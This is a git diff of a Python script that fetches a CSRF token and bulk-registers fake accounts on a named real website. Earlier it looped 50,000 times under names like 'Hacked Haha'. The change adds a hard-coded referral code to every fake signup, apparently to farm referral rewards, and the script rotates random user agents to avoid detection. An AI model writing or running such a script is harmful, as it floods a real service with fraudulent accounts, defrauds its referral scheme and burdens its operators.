@@ -21,7 +21,7 @@ def get_token(session, headers):
         return None
 
 # Function to submit form
-def submit_form(_token, session, _method, name, email, password, password_confirmation, headers):
+def submit_form(_token, session, _method, name, email, password, password_confirmation, referred_code, headers):
     url = 'https://saralshikshya.com.np/register'
     data = {
         '_token': _token,
@@ -29,6 +29,7 @@ def submit_form(_token, session, _method, name, email, password, password_confir
         'name': name,
         'email': email,
         'password': password,
+        'referred_code':referred_code,
         'confirm_password': password_confirmation,
     }
     try:
@@ -49,11 +50,11 @@ def main():
     
     with requests.Session() as session:
         headers = {"User-Agent": random.choice(user_agents)}
-        for _ in range(50000):  # Loop 5 times for testing, you can increase this number
-            email = f'itsmehacker{generate_random_numbers()}@gmail.com'
+        for _ in range(2):  # Loop 5 times for testing, you can increase this number
+            email = f'namastesaral{generate_random_numbers()}@gmail.com'
             _token = get_token(session, headers)
             if _token:
-                submit_form(_token, session, 'post', 'Hacked Haha', email, 'its_hack@123450', 'its_hack@123450', headers)
+                submit_form(_token, session, 'post', 'Namaste Haha', email, 'its_hack@123450', 'its_hack@123450', '655893', headers)
 
 if __name__ == "__main__":
     main()
